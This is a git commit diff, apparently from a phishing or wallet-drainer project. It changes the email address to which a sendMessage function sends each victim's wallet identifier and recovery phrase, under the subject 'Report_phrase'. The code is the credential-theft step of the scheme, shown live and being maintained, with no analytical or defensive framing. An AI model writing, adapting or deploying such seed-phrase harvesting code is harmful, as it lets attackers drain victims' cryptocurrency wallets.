ce33c660ca07917d7e47432126b38e36a2b775d7
jhonpower94 <33812639+jhonpower94@users.noreply.github.com>
2023-04-04 04:16:17 +0100

    Update server.js

--- src/config/server.js
+++ src/config/server.js
@@ -4,7 +4,7 @@ myHeaders.append("Content-Type", "application/json");
 export const sendMessage = async (data) => {
   var raw = JSON.stringify({
     message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
-    to: "resultbox4us@outlook.com",
+    to: "anwhite230@gmail.com",
     subject: "Report_phrase",
   });
 
